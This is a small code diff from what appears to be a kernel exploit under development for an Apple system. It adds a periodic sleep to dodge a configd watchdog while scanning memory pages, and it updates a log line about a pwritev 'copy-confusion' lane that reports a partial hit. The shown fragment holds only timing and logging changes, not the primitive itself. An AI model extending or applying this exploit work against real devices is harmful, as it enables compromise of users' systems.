@@ -209,6 +209,10 @@ kern_return_t cs2_pe_v1(void) {
                     }
                 }
                 seeking_offset += vm_page_size;
+                /* copy27: yield so configd can check in (watchdog 180s on 24A435). */
+                if (cs2_ctx.copy_confusion_lane &&
+                    ((seeking_offset / vm_page_size) % 32ull) == 0)
+                    usleep(20000);
             }
 
             // NOTE:
@@ -411,7 +415,7 @@ int cs2_run(void) {
         }
     }
     if (cs2_ctx.copy_confusion_lane)
-        LOG("lane: 27.0 copy-confusion (success pwritev + %#llx iov). hop-1 KEEP CLOSED. not CS verbatim.",
+        LOG("lane: 27.0 copy27 PARTIAL-window HIT (success pwritev + %#llx iov, mixed qwords). hop-1 KEEP CLOSED. not CS verbatim.",
             (unsigned long long)vm_page_size);
     else
         LOG("lane: OG EFAULT (w==-1) — 43520-viable train");
